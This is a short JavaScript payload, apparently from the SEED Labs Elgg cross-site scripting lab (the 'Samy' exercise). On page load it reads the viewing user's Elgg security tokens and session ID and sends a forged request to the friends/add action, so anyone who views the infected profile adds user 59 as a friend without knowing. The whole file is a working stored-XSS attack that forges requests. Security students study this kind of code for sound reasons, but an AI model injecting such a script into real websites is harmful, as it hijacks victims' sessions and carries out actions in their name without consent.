<script type="text/javascript">
	window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var sessionUser_id = elgg.session.user.guid;
        var owner_id = elgg.page_owner.guid;


        var sendurl=`http://www.seed-server.com/action/friends/add?friend=59${ts}${token}`; //FILL IN

        //Construct the HTTP request to add Samy as a friend.
        if(sessionUser_id != owner_id) {
            //Create and send Ajax request to add friend
            Ajax=new XMLHttpRequest();
            Ajax.open("GET",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            Ajax.send();
        }
	}
</script>